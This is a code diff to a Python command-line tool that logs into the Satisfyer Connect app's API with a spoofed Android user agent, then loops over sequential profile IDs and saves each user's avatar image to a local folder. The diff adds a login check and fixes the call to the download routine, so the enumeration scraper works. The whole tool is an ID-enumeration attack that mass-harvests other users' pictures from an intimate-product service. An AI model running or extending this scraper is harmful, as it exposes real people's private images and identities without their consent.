@@ -2,6 +2,7 @@ import requests, hashlib, sys, os, json
 
 class Session:
     x_auth_token = None
+    has_auth_token = 0
 
 session = Session
 
@@ -56,31 +57,41 @@ def login():
     elif response.status_code == 200:
         try:
             session.x_auth_token = response_json["token"]
+            session.has_auth_token = 1
             print("[i] Login successful!")
         except KeyError:
             print("[!] ERROR: X-Auth-Token header not found in response. Login failed.")
             print(response.text)
     
 
-def get_pfp(start, end):
-    headers = {
-        "Host": "connect.satisfyer.com",
-        "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 8.1.0; GT-I9505 Build/OPM2.171019.029)", # in this case we emulate an older Samsung Galaxy S4 with LineageOS I used for testing :)
-        "X-Auth-Token": session.x_auth_token,
-        "Accept-Encoding": "gzip, deflate",
-    }
+def get_pfp():
+    
+    if session.has_auth_token == 1:
 
-    url = "https://connect.satisfyer.com/external/avatar/{}?0"
+        start = int(input("Get pfps from ID: "))
+        end = int(input("Get pfps untill ID: "))    
+        headers = {
+            "Host": "connect.satisfyer.com",
+            "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 8.1.0; GT-I9505 Build/OPM2.171019.029)", # in this case we emulate an older Samsung Galaxy S4 with LineageOS I used for testing :)
+            "X-Auth-Token": session.x_auth_token,
+            "Accept-Encoding": "gzip, deflate",
+        }
 
-    for i in range(start, end):
-        url = "https://connect.satisfyer.com/external/avatar/{}?0".format(i)
-        print("Trying profile ID {}".format(i))
-        response = requests.get(url, headers=headers)
-        if response.status_code == 200:
-            with open("./satisfyer/image_{}.jpg".format(i), "wb") as f:
-                f.write(response.content)
-        else:
-            print("Failed to download image:", response.status_code)
+        url = "https://connect.satisfyer.com/external/avatar/{}?0"
+
+        for i in range(start, end):
+            url = "https://connect.satisfyer.com/external/avatar/{}?0".format(i)
+            print("Trying profile ID {}".format(i))
+            response = requests.get(url, headers=headers)
+            if response.status_code == 200:
+                with open("./satisfyer/image_{}.jpg".format(i), "wb") as f:
+                    f.write(response.content)
+            else:
+                print("Failed to download image:", response.status_code)
+    elif session.has_auth_token == 0:
+        print("[!] ERROR: user must be logged in to access this functionality. Use the 'login' command to do so.")
+    else:
+        print("[!] ERROR: bad has_auth_token flag value.")
 
 def prompt():
     while(True):
@@ -88,7 +99,7 @@ def prompt():
         if op == "login":
             login()
         elif op == "getpfp":
-            get_pfp
+            get_pfp()
         elif op == "help":
             show_help()
         elif op == "exit":
